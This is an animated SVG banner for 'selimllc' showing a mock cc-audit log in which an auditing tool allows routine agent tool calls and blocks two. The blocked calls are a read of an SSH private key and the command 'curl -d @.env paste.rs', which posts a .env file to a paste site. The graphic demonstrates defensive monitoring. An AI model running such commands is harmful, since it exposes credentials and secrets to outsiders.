<svg xmlns="http://www.w3.org/2000/svg" viewBox="-8 0 896 338" width="896" height="338" role="img" aria-labelledby="t">
<title id="t">selimllc. A cc-audit log tail: normal tool calls are allowed, reading an SSH key and posting .env are blocked.</title>
<style>
  .mono { font-family: ui-monospace, 'Cascadia Code', 'SF Mono', SFMono-Regular, Consolas, Menlo, monospace; font-size: 14px; }
  .sans { font-family: 'Segoe UI Variable Display', 'Segoe UI', system-ui, -apple-system, 'Helvetica Neue', Arial, sans-serif; }
  .fg { fill: #1f1d1a; } .muted { fill: #6e6a62; } .accent { fill: #c13d17; }
  .rule { stroke: #d9d5cd; stroke-width: 1; }
  .draw { transform-box: fill-box; transform-origin: left center;
           animation: draw 1.1s cubic-bezier(.2,.7,.2,1) both; }
  .grow { transform-box: fill-box; transform-origin: center bottom;
           animation: grow .7s cubic-bezier(.2,.7,.2,1) both; }
  .arrive { animation: arrive 1ms linear both; }
  .fade { animation: fade .6s ease-out both; }
  @keyframes draw { from { transform: scaleX(0); } to { transform: scaleX(1); } }
  @keyframes grow { from { transform: scaleY(0); } to { transform: scaleY(1); } }
  @keyframes arrive { from { opacity: 0; } to { opacity: 1; } }
  @keyframes fade { from { opacity: 0; } to { opacity: 1; } }
  
  .flash { opacity: 0; animation: flash 1.6s ease-out both; }
  @keyframes flash { 0% { opacity: .22; } 100% { opacity: 0; } }
  .cursor-move { animation: cursor 3.5s step-end both; }
  @keyframes cursor { 0% { transform: translateY(0px); } 14.29% { transform: translateY(28px); } 28.57% { transform: translateY(56px); } 48.57% { transform: translateY(84px); } 71.43% { transform: translateY(112px); } 94.29% { transform: translateY(140px); } 100% { transform: translateY(140px); } }
  .blink { animation: blink 1.05s step-end infinite; }
  @keyframes blink { 50% { opacity: 0; } }
  .rise { animation: rise .9s cubic-bezier(.2,.7,.2,1) both; animation-delay: 3.9s; }
  @keyframes rise { from { transform: translateY(78px); } to { transform: translateY(0); } }
  @media (prefers-reduced-motion: reduce) { .cursor-move { transform: translateY(140px); } }
  @media (prefers-reduced-motion: reduce) { * { animation: none !important; } }
</style>
  <text x="0" y="22" class="mono muted" style="font-size:12px;letter-spacing:.12em">ISTANBUL</text>
  <text x="880" y="22" class="mono muted" text-anchor="end" style="font-size:12px">$ cc-audit tail --follow</text>
  <line x1="0" y1="40" x2="880" y2="40" class="rule draw"/>
  <g class="arrive" style="animation-delay:0.5s">
    
    <text y="74" class="mono">
      <tspan x="0" class="muted">09:14:02</tspan>
      <tspan x="100" class="muted">allow</tspan>
      <tspan x="170" class="fg">Read</tspan>
      <tspan x="236" class="fg">~/selim/README.md</tspan>
      <tspan x="520" class="muted"></tspan>
    </text>
  </g>
  <g class="arrive" style="animation-delay:1.0s">
    
    <text y="102" class="mono">
      <tspan x="0" class="muted">09:14:02</tspan>
      <tspan x="100" class="muted">allow</tspan>
      <tspan x="170" class="fg">Bash</tspan>
      <tspan x="236" class="fg">whoami</tspan>
      <tspan x="520" class="muted">selimllc</tspan>
    </text>
  </g>
  <g class="arrive" style="animation-delay:1.7s">
    <rect x="-8" y="112" width="896" height="26" fill="#c13d17" class="flash" style="animation-delay:1.7s"/>
    <text y="130" class="mono">
      <tspan x="0" class="muted">09:14:03</tspan>
      <tspan x="100" class="accent">block</tspan>
      <tspan x="170" class="fg">Read</tspan>
      <tspan x="236" class="fg">~/.ssh/id_ed25519</tspan>
      <tspan x="520" class="accent">secret path</tspan>
    </text>
  </g>
  <g class="arrive" style="animation-delay:2.5s">
    
    <text y="158" class="mono">
      <tspan x="0" class="muted">09:14:03</tspan>
      <tspan x="100" class="muted">allow</tspan>
      <tspan x="170" class="fg">Bash</tspan>
      <tspan x="236" class="fg">ls ~/work</tspan>
      <tspan x="520" class="muted">cc-audit  cc-lease  php-admin-starter</tspan>
    </text>
  </g>
  <g class="arrive" style="animation-delay:3.3s">
    <rect x="-8" y="168" width="896" height="26" fill="#c13d17" class="flash" style="animation-delay:3.3s"/>
    <text y="186" class="mono">
      <tspan x="0" class="muted">09:14:04</tspan>
      <tspan x="100" class="accent">block</tspan>
      <tspan x="170" class="fg">Bash</tspan>
      <tspan x="236" class="fg">curl -d @.env paste.rs</tspan>
      <tspan x="520" class="accent">exfil, logged</tspan>
    </text>
  </g>
  <g class="cursor-move"><rect x="0" y="59" width="9" height="18" class="fg blink"/></g>
  <clipPath id="mask"><rect x="-8" y="234" width="896" height="96"/></clipPath>
  <g clip-path="url(#mask)">
    <text x="-3" y="310" class="sans fg rise" style="font-size:72px;letter-spacing:-.02em">
      <tspan style="font-weight:300">selim</tspan><tspan style="font-weight:600">llc</tspan>
    </text>
  </g>
</svg>
